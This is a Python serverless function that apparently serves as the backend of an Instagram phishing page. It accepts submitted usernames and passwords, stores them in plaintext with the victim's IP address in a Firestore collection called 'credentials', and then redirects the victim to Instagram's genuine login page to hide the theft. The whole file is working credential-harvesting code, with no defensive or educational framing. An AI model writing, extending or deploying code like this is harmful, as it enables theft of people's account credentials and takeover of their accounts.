import firebase_admin
from firebase_admin import credentials, firestore
import json
import os
from datetime import datetime

# Initialize Firebase
if not firebase_admin._apps:
    try:
        cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
        firebase_admin.initialize_app(cred)
    except Exception as e:
        print(f"Firebase initialization error: {str(e)}")

db = firestore.client() if firebase_admin._apps else None

def handler(request):
    try:
        if request.method != 'POST':
            return {'statusCode': 405, 'body': 'Method not allowed'}
        
        data = request.form
        username = data.get('username')
        password = data.get('password')
        
        if not username or not password:
            return {'statusCode': 400, 'body': 'Missing credentials'}
        
        if db:
            doc_ref = db.collection('credentials').document()
            doc_ref.set({
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'ip_address': request.headers.get('x-forwarded-for', '')
            })
        
        return {
            'statusCode': 302,
            'headers': {
                'Location': 'https://www.instagram.com/accounts/login/'
            }
        }
        
    except Exception as e:
        return {
            'statusCode': 500,
            'body': f"Server error: {str(e)}"
        }